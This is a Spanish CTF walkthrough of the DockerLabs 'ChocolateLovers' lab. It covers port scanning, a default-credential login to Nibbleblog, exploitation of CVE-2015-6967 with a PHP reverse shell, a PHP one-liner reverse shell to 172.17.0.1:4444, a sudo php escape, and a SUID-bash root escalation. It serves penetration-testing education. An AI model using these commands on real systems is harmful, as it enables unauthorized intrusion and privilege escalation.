---
title: ChocolateLovers - DockerLabs
published: true
categories: DockerLabs
---


| OS     | Dificultad  | Creator           |
| ------ | ----------- | -------------     | 
| Linux  |  Fácil      | ElPinguinoDeMario | 


# Reconocimiento

Comenzamos el proceso de reconocimiento identificando los puertos abiertos en el sistema objetivo. 
```shell
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG ports 
```
-  `-p-`: Escanea todos los puertos (1-65535).
- `--open`: Solo muestra los puertos abiertos.
- `-sS`: Realiza un escaneo SYN, que es rápido y discreto.
- `--min-rate=5000`: Envía al menos 5000 paquetes por segundo, acelerando el escaneo.
- `-n`: No realiza resolución DNS.
- `-Pn`: No realiza ping previo para determinar si el host está activo.
- `-vvv`: Muestra resultados detallados y en tiempo real.

![image](https://github.com/user-attachments/assets/1a88e550-b6f6-44b3-a926-36300c052091)


Durante el escaneo, descubrimos que los siguientes puertos están activos:
- `80` (HTTP)

A continuación, evaluamos si los puertos abiertos presentan alguna vulnerabilidad, además de obtener más información sobre los servicios asociados a esos puertos.

```bash
nmap -p 80-sCV 172.17.0.2 -oG targeted
```
![image](https://github.com/user-attachments/assets/4e42ce42-8f15-4ffb-b5f6-7c0b43148f2e)


# Exploración Web

Al acceder a la página web, observamos un panel de Apache que está configurado por defecto. 

![image](https://github.com/user-attachments/assets/0c8ea714-be14-4a40-ab76-f86d94cf2876)


Utilizamos `Gobuster` para realizar un reconocimiento web y explorar los directorios disponibles en el sitio.
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,doc,html,txt,img
```
- `gobuster dir` - Indica que estás utilizando la herramienta Gobuster para realizar un escaneo de directorios.
- `-u http://172.17.0.2/` Especifica la URL objetivo que deseas escanear en busca de directorios.
- `-w` Especifica que diccionario queremos usar
- `-x` Para indicar que tipo de extension queremos que nos encuentre

![image](https://github.com/user-attachments/assets/eaadd2b6-622e-4946-b00d-09b348b36ca9)

No encontramos nada relevante por esta vía, así que decidimos cambiar el enfoque.

![image](https://github.com/user-attachments/assets/0ea9d0a8-b545-4b7f-844a-89096d3674f1)

En el código fuente de la página encontramos una ruta que parece interesante, decidimos seguirla para investigar.

![image](https://github.com/user-attachments/assets/b4e80b01-4b77-4390-b6a2-cfcc571dfd9e)

Nos redirige a otra ruta llamada `admin.php`.

![image](https://github.com/user-attachments/assets/df5b70eb-2df2-40e7-8d3e-bf69d599fddb)

Al probar contraseñas por defecto, utilizamos` admin`/`admin` y conseguimos acceder.

![image](https://github.com/user-attachments/assets/cd5592ea-31d8-4fd2-834c-f27a794451ea)

Explorando la página en la sección de *settings*, encontramos la versión del servicio que está en ejecución.

![image](https://github.com/user-attachments/assets/da0af440-72e2-4ad6-9e0f-b7d9a7bc14b7)

Vamos a ver si existe algún exploit disponible para esta versión.

![image](https://github.com/user-attachments/assets/a928cf5a-d32c-494a-ba5b-95ef230b1e83)

Existen varios exploits para la versión que tenemos.

![image](https://github.com/user-attachments/assets/1e33f612-aaff-4481-93a1-ba8824a22c11)


## CVE-2015-6967

Usaremos este repositorio de github para explotarlo [CVE-2015-6967](https://github.com/dix0nym/CVE-2015-6967).

![image](https://github.com/user-attachments/assets/ef2fd301-d900-4d9e-a410-9a5757ad042f)

El exploit funciona a través de un plugin llamado `my_image`.

![image](https://github.com/user-attachments/assets/bf639fa4-57c7-4d69-bd64-96b417ac3297)

Parece que necesitamos instalar el plugin, ya que el exploit lo utiliza, pero no lo instala automáticamente.

![image](https://github.com/user-attachments/assets/5614a6c2-1616-4ab4-8ee9-8569d4433bc9)

Vamos a ejecutar el exploit. Antes de hacerlo, generamos nuestra reverse shell.

### Intrusión en la Máquina

Generamos la reverseshell utilizando **Pentest Monkey**, una herramienta popular para crear shells PHP que nos permiten obtener acceso remoto al servidor. La ruta de la reverseshell es la siguiente:

[Reverseshell de Pentest Monkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

Una vez que tengamos la reverse shell lista, descargamos el repositorio y ejecutamos el exploit.

```bash
git clone https://github.com/dix0nym/CVE-2015-6967.git
```
![image](https://github.com/user-attachments/assets/961eed03-0f9b-4739-910b-68db1bcb83d0)

Ejecutamos el siguiente comando para lanzar el exploit:

```bash
python3 exploit.py --url http://172.17.0.2/nibbleblog/ --username admin --password admin --payload ../shell.php
```
![image](https://github.com/user-attachments/assets/05587267-7e2a-493c-a53d-f8014fa5622f)

Investigando un poco más, descubrimos que en este repositorio están los plugins:
`http://172.17.0.2/nibbleblog/content/private/plugins/`

![image](https://github.com/user-attachments/assets/f5497815-e9bc-4367-9b0f-43be7cc8c2ec)

### Pasos para Cargar la Reverseshell

Nos ponemos a escuchar en nuestro caso el puerto 4444 con `netcat`:
```bash 
nc -lvnp 4444
```
Luego accedemos a la ruta donde subimos la reverse shell, haciendo clic en el archivo `image.php`:

![image](https://github.com/user-attachments/assets/87fb6f40-fbe1-4394-b1b4-503c15c52bd4)

Con esto, ya tendríamos acceso a la máquina.

![image](https://github.com/user-attachments/assets/63dc6070-4522-4655-9f14-f39f94fa82d5)

## TTY ReverseShell

### Iniciar una sesión de shell interactiva
En nuestra shell básica, ejecutamos el siguiente comando para forzar la creación de una sesión de bash interactiva:
```bash
script /dev/null -c bash
```
### Suspender la shell
Una vez que el comando anterior está en ejecución, utilizamos
```bash
Control+Z
```
para suspender temporalmente nuestra shell.

### Preparar nuestro terminal local:
Antes de volver a nuestra shell, configuramos nuestro terminal local:
```bash
stty raw -echo; fg
```

### Resetear la configuración del terminal
Ahora que tenemos el control de la shell, la reseteamos para asegurar que se comporta correctamente:
```bash
reset
```

### Configura el tipo de terminal:
```bash
xterm
export TERM=xterm
export SHELL=bash
```

# Intrusion

Ahora que estamos dentro de la máquina, si ejecutamos el comando `sudo -l`, vemos que podemos ejecutar `php` como el usuario `chocolate`. Si no sabemos cómo aprovechar esto, podemos recurrir a [GTFOBins](https://gtfobins.github.io/).

![image](https://github.com/user-attachments/assets/139acb72-7157-4ef0-8099-3a8e6851d7c2)

Para obtener una shell como el usuario `chocolate`, ejecutamos el siguiente comando:

```shell
www-data@5a6d69b701d7:/$ CMD="/bin/sh"
www-data@5a6d69b701d7:/$ sudo -u chocolate php -r "system('$CMD');"
```
Si ejecutamos `whoami`, podemos ver que ya somos el usuario chocolate.

![image](https://github.com/user-attachments/assets/f24c07d0-8694-4c64-b01d-caf7347f6b6b)

Tuve problemas al ejecutar una shell directamente, así que decidí generar otra reverse shell y repetir los pasos para obtener una TTY interactiva.

```bash
sudo -u chocolate /usr/bin/php -r '$sock=fsockopen("172.17.0.1", 4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```
![image](https://github.com/user-attachments/assets/d6da8e77-bd3c-4908-b52a-b2cad03fcbd8)

Por el otor lado estamos escuchando.
```bash
nc -lvnp 4444
```
![image](https://github.com/user-attachments/assets/8d272dbe-51ec-4f56-899b-eaf2a3744165)

Una vez reconectados a la máquina con la nueva reverse shell, repetimos los pasos para configurar una shell interactiva (TTY). 

# Accedor Root

Investigamos un poco más dentro del sistema y observamos que hay un proceso ejecutado por root que corre un script llamado `script.php`.

![image](https://github.com/user-attachments/assets/d02290f2-e767-4831-89a0-83cfa22a183f)

El gran descubrimiento aquí es que tenemos permisos para modificar este archivo `script.php`. Como podemos editarlo, decidimos insertar una línea que nos dará una shell como usuario `root`.

Modificamos el contenido de `script.php` para que ejecute una shell elevada:

![image](https://github.com/user-attachments/assets/283e2201-7c80-4f78-a1ec-ea80de878f97)

Como podemos cambiarlo a nuestro antojo vamos a poner lo siguiente.

```php
<?php
exec("chmod u+s /bin/bash");
?>
```
![image](https://github.com/user-attachments/assets/4f0b10d2-6146-4835-a4eb-4959835d69cb)

Con esta línea, al ejecutarse el script por el proceso `root`, el binario `bash` se actualizará para tener el bit SUID (Set User ID). Esto significa que cualquier usuario que ejecute este binario obtendrá permisos de `root`.

Tras esperar a que el script se ejecute automáticamente, simplemente lanzamos una shell de la siguiente manera:

```bash
bash -p
```

Ahora, verificamos si efectivamente hemos obtenido privilegios de `root` ejecutando `whoami`.


![image](https://github.com/user-attachments/assets/d518ea73-baa7-491c-bba1-b25029b181cf)

¡Y listo! Ahora somos `root` en la máquina. 
